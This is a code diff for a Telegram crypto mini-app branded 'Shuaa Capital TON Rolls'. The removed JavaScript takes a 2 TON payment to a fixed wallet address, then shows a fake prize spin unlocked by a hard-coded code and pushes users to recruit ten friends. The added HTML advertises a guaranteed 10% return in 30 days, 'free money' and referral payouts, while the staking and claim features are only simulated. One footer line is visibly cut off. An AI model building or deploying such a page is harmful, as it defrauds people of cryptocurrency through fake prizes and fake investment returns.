@@ -1,288 +1,227 @@
-document.addEventListener('DOMContentLoaded', () => {
-    const startScreen = document.querySelector('.start-screen');
-    const page = document.querySelector('.page');
-    const headerBurger = document.querySelector('.header__burger');
-    const headerNav = document.querySelector('.header__nav');
-    const bottomNavTabs = document.querySelectorAll('.bottom-nav li');
-    const sectionContents = document.querySelectorAll('.section-content');
-
-    // --- 1. Start Screen Logic ---
-    startScreen.classList.add('active'); // Ensure active class is set for animation
-    setTimeout(() => {
-        startScreen.classList.add('fade-out');
-        startScreen.addEventListener('animationend', () => {
-            startScreen.classList.add('hide');
-            page.classList.remove('hide');
-        }, { once: true });
-    }, 3000); // Show loading for 3 seconds
-
-    // --- 2. Header Burger Menu Toggle ---
-    headerBurger.addEventListener('click', () => {
-        headerBurger.classList.toggle('active');
-        headerNav.classList.toggle('active');
-    });
-
-    // --- 3. Bottom Navigation Tab Switching ---
-    // Set initial active section to Rolls
-    document.getElementById('content-rolls').classList.add('active-section');
-    bottomNavTabs.forEach(tab => {
-        tab.addEventListener('click', () => {
-            // Haptic Feedback for tab clicks
-            if (navigator.vibrate) {
-                navigator.vibrate(50); // Short subtle vibration
-            }
-
-            const targetSectionId = tab.dataset.section;
-
-            // Remove active class from all tabs and sections
-            bottomNavTabs.forEach(t => t.classList.remove('active'));
-            sectionContents.forEach(s => {
-                s.classList.remove('active-section');
-                s.classList.add('hidden-section');
-            });
-
-            // Add active class to clicked tab
-            tab.classList.add('active');
-
-            // Show the target section
-            const targetSection = document.getElementById(`content-${targetSectionId}`);
-            if (targetSection) {
-                targetSection.classList.remove('hidden-section');
-                targetSection.classList.add('active-section');
-            }
-        });
-    });
-
-    // --- 4. TON Connect Wallet & Rolls Logic ---
-    const rollsInfoText = document.querySelector('.rolls-info-text');
-    // Removed connectWalletBtnRolls as it's now handled by tc-widget-root
-    const payForRollsBtn = document.getElementById('payForRollsBtn'); // Custom button
-    const codeEntrySection = document.querySelector('.code-entry-section');
-    const confirmationCodeInput = document.getElementById('confirmationCodeInput');
-    const verifyCodeBtn = document.getElementById('verifyCodeBtn');
-    const codeErrorMessage = document.getElementById('codeErrorMessage');
-    const referralAfterCodeMessage = document.querySelector('.referral-after-code-message');
-    const loadingAnimation = document.querySelector('.loading-animation');
-    const checkmarkAnimation = document.querySelector('.checkmark-animation');
-    const spinningWheel = document.querySelector('.spinning-wheel'); // Corrected variable name
-
-    let isWalletConnected = false; // Track connection status
-    let tonConnectUI; // Declare globally or in a scope accessible by init
-
-    // Initialize TON Connect UI with buttonRootId
-    tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-        manifestUrl: 'https://tonairdrops.vercel.app/tonconnect-manifest.json',
-        buttonRootId: 'tc-widget-root' // This tells TonConnectUI where to render its button
-    });
-
-    // Listen for TonConnectUI status changes
-    tonConnectUI.onStatusChange(wallet => {
-        if (wallet) {
-            isWalletConnected = true;
-            rollsInfoText.textContent = `Wallet connected: ${wallet.account.address.substring(0, 6)}...${wallet.account.address.substring(wallet.account.address.length - 4)}. Now, pay 2 TON to roll!`;
-            // connectWalletBtnRolls is no longer needed here as TonConnectUI manages its own button
-            payForRollsBtn.disabled = false; // Enable pay button
-            
-            // Hide code entry/referral if wallet connects (reset state)
-            codeEntrySection.classList.add('hide');
-            referralAfterCodeMessage.classList.add('hide');
-
-        } else {
-            isWalletConnected = false;
-            rollsInfoText.textContent = 'Connect your TON wallet to participate.';
-            // connectWalletBtnRolls is no longer needed here
-            payForRollsBtn.disabled = true; // Disable pay button
-            codeEntrySection.classList.add('hide');
-            referralAfterCodeMessage.classList.add('hide');
-        }
-    });
-
-    // Custom Pay 2 TON & Roll Button Click
-    payForRollsBtn.addEventListener('click', async () => {
-        if (navigator.vibrate) { navigator.vibrate(50); } // Haptic feedback
-        if (!isWalletConnected) {
-            rollsInfoText.textContent = 'Please connect your wallet first!';
-            return;
-        }
-
-        // Disable pay button to prevent multiple clicks during transaction
-        payForRollsBtn.disabled = true; 
-
-        const transaction = {
-            validUntil: Math.floor(Date.now() / 1000) + 360, // 6 minutes
-            messages: [
-                {
-                    address: 'UQD8J5QN9ygpY30_afh0pqnpmTVHePlt1WrTBg-otAUjDpNG', // Your specified wallet address for 2 TON
-                    amount: '2000000000', // 2 TON in nanoton (2 * 10^9)
-                },
-            ],
-        };
-
-        try {
-            // Send the transaction using TonConnectUI
-            const result = await tonConnectUI.sendTransaction(transaction);
-            console.log('Transaction successful:', result);
-            
-            // --- Execute success simulation after actual transaction is sent ---
-            loadingAnimation.classList.remove('hide');
-            rollsInfoText.classList.add('hide'); // Hide info text during loading
-            
-            // Spin the wheel
-            spinningWheel.style.transition = 'transform 4s cubic-bezier(0.25, 0.1, 0.25, 1)';
-            spinningWheel.style.transform = `rotate(${Math.random() * 360 + 1080}deg)`; // Spin 3+ times
-
-            if (navigator.vibrate) { navigator.vibrate(100); } // Medium vibration for successful payment/spin
-
-            setTimeout(() => {
-                loadingAnimation.classList.add('hide');
-                checkmarkAnimation.classList.remove('hide');
-                rollsInfoText.classList.remove('hide'); // Show info text again
-                rollsInfoText.textContent = 'Payment successful! Enter your code to claim your prize.';
-                codeEntrySection.classList.remove('hide'); // Show code entry
-                checkmarkAnimation.addEventListener('loopComplete', () => {
-                    checkmarkAnimation.classList.add('hide');
-                }, { once: true });
-            }, 4000); // Simulate 4 seconds for spin + loading after successful transaction
-
-        } catch (e) {
-            console.error('Transaction failed:', e);
-            rollsInfoText.textContent = 'Payment failed. Please try again.';
-            loadingAnimation.classList.add('hide'); // Hide loading if it was shown
-            payForRollsBtn.disabled = false; // Re-enable pay button on failure
-        }
-    });
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shuaa Capital - TON Rolls</title>
+    <link rel="icon" href="img/toncoin.png" type="image/png">
     
-    // Simulate code verification
-    verifyCodeBtn.addEventListener('click', () => {
-        const enteredCode = confirmationCodeInput.value.trim();
-        codeErrorMessage.classList.add('hide'); // Hide previous errors
-        
-        if (navigator.vibrate) { navigator.vibrate(50); } // Haptic Feedback for button click
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    
+    <script src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js"></script>
+    
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
 
-        if (enteredCode === '909986') { // Correct code
-            codeEntrySection.classList.add('hide');
-            referralAfterCodeMessage.classList.remove('hide');
-            rollsInfoText.classList.add('hide'); // Hide previous info text
-            // Optional: Disable further interaction or redirect
-        } else {
-            codeErrorMessage.classList.remove('hide');
-            confirmationCodeInput.classList.add('error'); // Add error styling
-            if (navigator.vibrate) { navigator.vibrate(150); } // Vibrate for error
-            setTimeout(() => confirmationCodeInput.classList.remove('error'), 1500); // Remove error after a bit
-        }
-    });
+    <div class="start-screen active">
+        <div class="start-screen__content">
+            <h1 class="start-screen__title">ROLLS</h1> 
+            <div class="start-screen__rolls-shadows">
+                <span>TON ROLLS</span>
+                <span>TON ROLLS</span>
+                <span>TON ROLLS</span>
+            </div>
+            <lottie-player class="start-screen__loading-spinner" src="spinner.json" background="transparent" speed="1" loop autoplay></lottie-player>
+            <p class="start-screen__loading-text">Powered By Shuaa Capital</p>
+        </div>
+    </div>
 
-    // --- 5. Staking Section Logic ---
-    const stakingAmountInput = document.getElementById('stakingAmount');
-    const estimatedProfitSpan = document.getElementById('estimatedProfit');
-    const stakingFeeSpan = document.getElementById('stakingFee');
-    const totalReturnSpan = document.getElementById('totalReturn');
-    const stakeTonBtn = document.getElementById('stakeTonBtn');
-    const learnMoreLink = document.querySelector('.learn-more-link');
-    const learnMoreContent = document.querySelector('.learn-more-content');
+    <div class="page hide">
+        <header class="header">
+            <div class="container header__wrapper">
+                <a href="#" class="header__logo">
+                    <svg width="60" height="60" viewBox="0 0 60 60" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M30 0C13.4314 0 0 13.4314 0 30C0 46.5686 13.4314 60 30 60C46.5686 60 60 46.5686 60 30C60 13.4314 46.5686 0 30 0ZM40.9287 21.0713L30 31.9999L19.0713 21.0713C18.4856 20.4856 17.5144 20.4856 16.9287 21.0713C16.3431 21.657 16.3431 22.6282 16.9287 23.2139L28.7861 35.0713C29.3718 35.657 30.3431 35.657 30.9287 35.0713L42.7861 23.2139C43.3718 22.6282 43.3718 21.657 42.7861 21.0713C42.2004 20.4856 41.2292 20.4856 40.9287 21.0713Z" fill="currentColor"/>
+                    </svg>
+                </a>
+                <nav class="header__nav">
+                    <ul class="header__nav-list">
+                        <li><a href="#" data-section="rolls">Rolls</a></li>
+                        <li><a href="#" data-section="earn">Earn</a></li>
+                        <li><a href="#" data-section="staking">Staking</a></li>
+                        <li><a href="#" data-section="team">Team</a></li>
+                    </ul>
+                </nav>
+                <button class="header__burger">
+                    <span></span>
+                </button>
+            </div>
+        </header>
 
-    const STAKING_RATE_DAILY = 0.10 / 30; // 10% profit over 30 days, daily rate
-    const FEE_RATE = 0.01; // 1% fee on total profit
+        <main class="page__wrapper">
+            <section id="content-rolls" class="section-content active-section">
+                <div class="page__logo">
+                    <img src="toncoin1.png" alt="TON Coin">
+                </div>
+                <div class="ton">
+                    <div class="ton__icon">
+                        <img src="toncoin1.png" alt="TON">
+                    </div>
+                    <p class="ton__title">Gift</p>
+                    <p class="ton__abb">/spin</p>
+                </div>
 
-    const updateStakingSummary = () => {
-        const amount = parseFloat(stakingAmountInput.value);
-        if (isNaN(amount) || amount <= 0) {
-            estimatedProfitSpan.textContent = '0 TON';
-            stakingFeeSpan.textContent = '0 TON';
-            totalReturnSpan.textContent = '0 TON';
-            stakeTonBtn.disabled = true;
-            stakeTonBtn.style.opacity = '0.5';
-            return;
-        }
-        stakeTonBtn.disabled = false;
-        stakeTonBtn.style.opacity = '1';
+                <div class="rolls-main-area">
+                    <p class="rolls-info-text">You can try your luck with 2 numbers "each account once"</p>
+                    
+                    <div class="spinner-container">
+                        <img src="rolls_wheel_background.png" alt="Spinning Wheel" class="spinning-wheel">
+                        <div class="spinner-needle"></div>
+                        <div class="spinner-center-text"></div>
+                    </div>
 
-        const estimatedTotalProfit = amount * STAKING_RATE_DAILY * 30; // Total profit for 30 days
-        const stakingFee = estimatedTotalProfit * FEE_RATE;
-        const totalReturn = amount + estimatedTotalProfit - stakingFee;
+                    <center> <div id="ton-connect"></div> </center> 
+                    <button id="connectWalletBtn" class="primary-button rolls-action-button">Connect Wallet</button>						   
+                    <button id="sendTransactionBtn" class="primary-button rolls-action-button" disabled>Pay & Roll</button>
 
-        estimatedProfitSpan.textContent = `${estimatedTotalProfit.toFixed(2)} TON`;
-        stakingFeeSpan.textContent = `${stakingFee.toFixed(2)} TON`;
-        totalReturnSpan.textContent = `${totalReturn.toFixed(2)} TON`;
-    };
+                    <lottie-player class="loading-animation hide" src="spinner.json" background="transparent" speed="1" loop autoplay></lottie-player>
+                    <lottie-player class="checkmark-animation hide" src="check.json" background="transparent" speed="1" autoplay></lottie-player>
 
-    stakingAmountInput.addEventListener('input', updateStakingSummary);
-    updateStakingSummary(); // Initial calculation
+                    <div class="code-entry-section hide">
+                        <p class="code-entry-info">Enter the confirmation code you received:</p>
+                        <div class="input-group">
+                            <input type="text" id="confirmationCodeInput" placeholder=" ">
+                            <label for="confirmationCodeInput">Confirmation Code</label>
+                        </div>
+                        <p id="codeErrorMessage" class="error-message hide">Invalid code. Please try again.</p>
+                        <button id="verifyCodeBtn" class="primary-button">Verify Code</button>
+                    </div>
 
-    stakeTonBtn.addEventListener('click', () => {
-        if (navigator.vibrate) { navigator.vibrate(50); } // Haptic Feedback for button click
+                    <p class="referral-after-code-message hide">
+                        Congratulations! Your prize has been credited. Now, invite 10 friends to the bot via the "Earn" section to fully activate your prize and earn more!
+                    </p>
+                </div>
+            </section>
 
-        const amount = parseFloat(stakingAmountInput.value);
-        if (isNaN(amount) || amount <= 0) {
-            alert('Please enter a valid amount to stake.');
-            return;
-        }
-        // Simulate staking transaction (no actual blockchain interaction here)
-        alert(`Simulating staking of ${amount} TON. This would initiate a transaction in a real DApp.`);
-        // In a real DApp, you would use tonConnectUI.sendTransaction here
-    });
+            <section id="content-earn" class="section-content hidden-section">
+                <div class="earn-user-profile">
+                    <img src="telegram.png" alt="User Profile" class="earn-user-pic">
+                    <h3 class="earn-user-name">Get Free Money</h3>
+                </div>
 
-    learnMoreLink.addEventListener('click', (e) => {
-        e.preventDefault();
-        learnMoreContent.classList.toggle('hide');
-        learnMoreLink.textContent = learnMoreContent.classList.contains('hide') ? 'Learn More About Staking' : 'Show Less';
-        if (navigator.vibrate) { navigator.vibrate(30); } // Haptic Feedback for toggle
-    });
+                <div class="earn-invite-card">
+                    <h3>Boost Your Earnings: Invite Friends!</h3>
+                    <p>
+                        Share your unique referral link and earn a fantastic <strong class="highlight-text">20% from your friends' staking profits</strong> and <strong class="highlight-text">10% from their Rolls fees!</strong> The more they play, the more you earn!
+                    </p>
+                    <div class="input-group referral-link-group">
+                        <input type="text" id="referralLink" value="http://t.me/ShuaaCapitalBot?start=YOUR_REFERRAL_CODE" readonly>
+                        <button class="copy-referral-btn"><i class="far fa-copy"></i> Copy</button>
+                    </div>
+                </div>
 
-    // --- 6. Earn Section Logic ---
-    const referralLinkInput = document.getElementById('referralLink');
-    const copyReferralBtn = document.querySelector('.copy-referral-btn');
-    const claimRewardBtn = document.querySelector('.stat-value .claim-btn');
+                <div class="earn-stats-container">
+                    <div class="stat-box">
+                        <p class="stat-label">Total Referrals</p>
+                        <p class="stat-value">0</p>
+                    </div>
+                    <div class="stat-box">
+                        <p class="stat-label">Total Earnings</p>
+                        <p class="stat-value">
+                            0 TON
+                            <button class="claim-btn">Claim</button>
+                        </p>
+                    </div>
+                </div>
+            </section>
 
-    copyReferralBtn.addEventListener('click', () => {
-        referralLinkInput.select();
-        referralLinkInput.setSelectionRange(0, 99999); // For mobile devices
-        document.execCommand('copy');
-        copyReferralBtn.textContent = 'Copied!';
-        setTimeout(() => {
-            copyReferralBtn.innerHTML = '<i class="far fa-copy"></i> Copy'; // Reset button text
-        }, 2000);
-        if (navigator.vibrate) { navigator.vibrate(50); } // Haptic Feedback
-    });
+            <section id="content-staking" class="section-content hidden-section">
+                <div class="staking-header">
+                    <img src="toncoin1.png" alt="Staking Icon" class="staking-header-icon">
+                    <h2 class="staking-title">Elevate Your Earnings with TON Staking</h2>
+                </div>
+                <p class="staking-banner-text">
+                    Unlock passive income! Earn a solid 10% profit on your TON over just 30 days.
+                </p>
 
-    if (claimRewardBtn) {
-        claimRewardBtn.addEventListener('click', () => {
-            alert('Claiming rewards simulated! In a real DApp, this would initiate a withdrawal transaction.');
-            if (navigator.vibrate) { navigator.vibrate(70); } // Haptic Feedback
-        });
-    }
+                <div class="staking-input-wrapper">
+                    <div class="input-group">
+                        <input type="number" id="stakingAmount" placeholder=" " min="1" step="0.1">
+                        <label for="stakingAmount">TON Amount to Stake</label>
+                    </div>
+                </div>
 
-    // Placeholder for dynamic user name in Earn section
-    const earnUserName = document.querySelector('.earn-user-name');
-    // You would typically get the Telegram username from Telegram Mini App API or a backend.
-    // For now, it remains a static placeholder.
-    // Example: if (window.Telegram.WebApp) earnUserName.textContent = `@${window.Telegram.WebApp.initDataUnsafe.user.username || 'TelegramUser'}`;
+                <button id="stakeTonBtn" class="primary-button">Stake TON Now!</button>
+                <a href="#" class="learn-more-link">Learn More About Staking</a>
+                <div class="learn-more-content hide">
+                    <p><strong>What is Staking?</strong> Staking is a way to earn rewards for holding certain cryptocurrencies. By "staking" your crypto, you lock it up to help maintain the security and operations of a blockchain network. In return, you earn more cryptocurrency.</p>
+                    <p><strong>How it Works:</strong> When you stake your TON with Shuaa Capital, your funds are added to our secure staking pool. We manage the staking process, and you receive a share of the rewards generated by the network, minus a small fee for our services.</p>
+                    <p><strong>Benefits:</strong> Earn passive income, contribute to network security, and maintain liquidity (you can unstake your funds at any time).</p>
+                </div>
+            </section>
 
+            <section id="content-team" class="section-content hidden-section">
+                <h2 class="team-section-title">Our Vision: Powering Your Experience on TON</h2>
+                <p class="team-description-text">
+                    At Shuaa Capital, we are driven by a singular vision: to create an unparalleled gaming and earning experience within the Telegram ecosystem. We proudly leverage The Open Network (TON), a robust and decentralized blockchain born from the innovative spirit of Telegram. Our dedicated team is committed to building a transparent, secure, and user-friendly platform that seamlessly connects millions of Telegram users to the exciting world of TON. Join us in shaping the future of decentralized entertainment and finance!
+                </p>
 
-    // --- 7. Team Section Photo Interaction ---
-    const teamPhotos = document.querySelectorAll('.team-photo');
+                <div class="team-members-photos">
+                    <img src="IMG_20250724_235109_161.jpeg" alt="Team Member 1" class="team-photo blurred">
+                    <img src="IMG_20250724_235115_423.png" alt="Team Member 2" class="team-photo blurred">
+                </div>
 
-    teamPhotos.forEach(photo => {
-        photo.addEventListener('click', () => {
-            if (navigator.vibrate) { navigator.vibrate(30); } // Haptic Feedback
+                <div class="contact-details">
+                    <h3>Reach Out To Us</h3>
+                    <p><strong>Headquarters:</strong> Shuaa Capital Company, 12th Floor, Tawun Tower, Al Maktoum St, Baniyas Sq, Dubai, UAE</p>
+                    <p><strong>Phone:</strong> +971567238336</p>
+                    <p><strong>Working Hours:</strong> 10:00 AM - 10:00 PM (Gulf Standard Time)</p>
+                    <p><strong>Dedicated Support:</strong> <a href="http://t.me/ShuaaCapitalBot" target="_blank">@ShuaaCapitalBot</a></p>
+                </div>
+            </section>
 
-            // Toggle elevated class for the clicked photo
-            if (photo.classList.contains('elevated')) {
-                photo.classList.remove('elevated');
-                photo.classList.add('blurred');
-            } else {
-                // Remove elevated class from all other photos first
-                teamPhotos.forEach(p => {
-                    p.classList.remove('elevated');
-                    p.classList.add('blurred');
-                });
-                photo.classList.remove('blurred');
-                photo.classList.add('elevated');
-            }
-        });
-    });
+            <div class="global-timer-section">
+                <p class="timer-label">Next Grand Gift Drop:</p>
+                <div id="countdown" class="timer-display">July 29, 12:00 PM UTC</div>
+                <p class="timer-note">Don't miss out on upcoming opportunities!</p>
+            </div>
+        </main>
 
-    // --- 8. Global Countdown Timer (Removed logic, now static) ---
-    // The countdown element is now static in index.html, so no JavaScript is needed for it.
-    // Removed: updateCountdown function and setInterval.
-});
+        <footer class="footer">
+            <div class="container footer__wrapper">
+                <a href="#" class="footer__logo">
+                    <svg width="60" height="60" viewBox="0 0 60 60" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M30 0C13.4314 0 0 13.4314 0 30C0 46.5686 13.4314 60 30 60C46.5686 60 60 46.5686 60 30C60 13.4314 46.5686 0 30 0ZM40.9287 21.0713L30 31.9999L19.0713 21.0713C18.4856 20.4856 17.5144 20.4856 16.9287 21.0713C16.3431 21.657 16.3431 22.6282 16.9287 23.2139L28.7861 35.0713C29.3718 35.657 30.3431 35.657 30.9287 >
+            <ul class="footer__soc">
+                <li><a href="http://t.me/ShuaaCapitalBot" target="_blank"><i class="fab fa-telegram-plane"></i></a></li>
+                <li><a href="https://twitter.com/ShuaaCapital" target="_blank"><i class="fab fa-twitter"></i></a></li>
+                <li><a href="https://github.com/ShuaaCapital" target="_blank"><i class="fab fa-github"></i></a></li>
+            </ul>
+        </div>
+    </footer>
+
+    <nav class="bottom-nav">
+        <ul>
+            <li data-section="rolls" class="active">
+                <i class="fas fa-dice"></i>
+                <span>Rolls</span>
+            </li>
+            <li data-section="earn">
+                <i class="fas fa-hand-holding-usd"></i>
+                <span>Earn</span>
+            </li>
+            <li data-section="staking">
+                <i class="fas fa-coins"></i>
+                <span>Staking</span>
+            </li>
+            <li data-section="team">
+                <i class="fas fa-users"></i>
+                <span>Team</span>
+            </li>
+        </ul>
+    </nav>
+</div>
+
+<script src="assets/web3-provider.js"></script> 
+<script src="scriptton.js"></script>
+</body>
+</html>
